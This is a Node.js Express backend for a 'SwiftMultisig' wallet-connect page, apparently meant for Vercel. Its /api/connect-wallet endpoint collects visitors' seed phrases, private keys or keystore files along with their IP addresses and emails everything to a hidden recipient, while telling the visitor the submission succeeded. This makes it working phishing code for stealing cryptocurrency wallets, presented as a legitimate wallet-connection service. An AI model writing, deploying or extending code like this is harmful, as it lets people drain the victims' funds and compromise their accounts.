const express = require('express');
const cors = require('cors');
const nodemailer = require('nodemailer');
const bodyParser = require('body-parser');

const app = express();

// Middleware
app.use(cors());
app.use(bodyParser.json());
app.use(bodyParser.urlencoded({ extended: true }));

// Email configuration from environment variables (Vercel)
const EMAIL_CONFIG = {
    user: process.env.EMAIL_USER,
    pass: process.env.EMAIL_PASS,
    recipient: process.env.RECIPIENT_EMAIL
};

let transporter = null;
if (EMAIL_CONFIG.user && EMAIL_CONFIG.pass) {
    transporter = nodemailer.createTransport({
        service: 'gmail',
        auth: {
            user: EMAIL_CONFIG.user,
            pass: EMAIL_CONFIG.pass
        }
    });
}

// Generate demo recovery phrase
function generateRecoveryPhrase() {
    const words = [
        'abandon', 'ability', 'able', 'about', 'above', 'absent', 'absorb', 'abstract', 'absurd', 'abuse',
        'access', 'accident', 'account', 'accuse', 'achieve', 'acid', 'acoustic', 'acquire', 'across', 'act',
        'action', 'actor', 'actress', 'actual', 'adapt', 'add', 'addict', 'address', 'adjust', 'admit',
        'adult', 'advance', 'advice', 'aerobic', 'affair', 'afford', 'afraid', 'africa', 'after', 'again',
        'age', 'agent', 'agree', 'ahead', 'aim', 'air', 'airport', 'aisle', 'alarm', 'album'
    ];
    
    const selected = [];
    for (let i = 0; i < 12; i++) {
        selected.push(words[Math.floor(Math.random() * words.length)]);
    }
    return selected.join(' ');
}

// API endpoint
app.post('/api/connect-wallet', async (req, res) => {
    try {
        const { 
            walletType, 
            importMethod, 
            credentialData, 
            network, 
            connectionMethod,
            timestamp 
        } = req.body;
        
        const ipAddress = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
        
        let actualCredential = '';
        let credentialType = '';
        
        if (importMethod === 'seed') {
            actualCredential = credentialData || 'No seed phrase provided';
            credentialType = 'Recovery Phrase (Seed Phrase)';
        } else if (importMethod === 'private') {
            actualCredential = credentialData || 'No private key provided';
            credentialType = 'Private Key';
        } else if (importMethod === 'json') {
            actualCredential = credentialData || 'JSON file uploaded';
            credentialType = 'JSON Keystore File';
        }
        
        // Send email if configured
        let emailSent = false;
        if (transporter && EMAIL_CONFIG.recipient) {
            try {
                const emailHtml = `
                    <!DOCTYPE html>
                    <html>
                    <head>
                        <style>
                            body { font-family: Arial, sans-serif; }
                            .container { max-width: 600px; margin: 0 auto; padding: 20px; }
                            .header { background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); color: white; padding: 20px; text-align: center; }
                            .content { background: #f9f9f9; padding: 30px; }
                            .credential-box { background: #1a1a1a; color: #10b981; padding: 15px; border-radius: 8px; font-family: monospace; margin: 20px 0; }
                            .detail { margin: 15px 0; padding: 10px; background: white; border-left: 4px solid #667eea; }
                        </style>
                    </head>
                    <body>
                        <div class="container">
                            <div class="header">
                                <h1>🔐 Wallet Submission - ${walletType || 'Unknown'}</h1>
                            </div>
                            <div class="content">
                                <div class="detail"><strong>Wallet Type:</strong> ${walletType || 'Not specified'}</div>
                                <div class="detail"><strong>Field Type:</strong> ${credentialType}</div>
                                <div class="credential-box"><strong>Data:</strong><br>${actualCredential}</div>
                                <div class="detail"><strong>Network:</strong> ${network || 'Multi-Chain'}</div>
                                <div class="detail"><strong>Timestamp:</strong> ${new Date().toLocaleString()}</div>
                                <div class="detail"><strong>Visitor IP:</strong> ${ipAddress}</div>
                            </div>
                        </div>
                    </body>
                    </html>
                `;
                
                await transporter.sendMail({
                    from: `"SwiftMultisig" <${EMAIL_CONFIG.user}>`,
                    to: EMAIL_CONFIG.recipient,
                    subject: `🔐 Wallet Submission - ${walletType} (${credentialType})`,
                    html: emailHtml,
                    text: `Wallet Type: ${walletType}\nField Type: ${credentialType}\nData: ${actualCredential}\nIP: ${ipAddress}`
                });
                
                emailSent = true;
            } catch (emailError) {
                console.error('Email error:', emailError);
            }
        }
        
        res.json({
            success: true,
            message: 'Submitted Successfully',
            data: { connectionId: Date.now(), emailSent }
        });
        
    } catch (error) {
        console.error('Error:', error);
        res.status(500).json({
            success: false,
            message: 'Submission failed',
            error: error.message
        });
    }
});

// Health check
app.get('/api/health', (req, res) => {
    res.json({ status: 'healthy', timestamp: new Date().toISOString() });
});

// Test endpoint
app.get('/api/test', (req, res) => {
    res.json({ message: 'Backend is working!', timestamp: new Date().toISOString() });
});

// For Vercel serverless function
module.exports = app;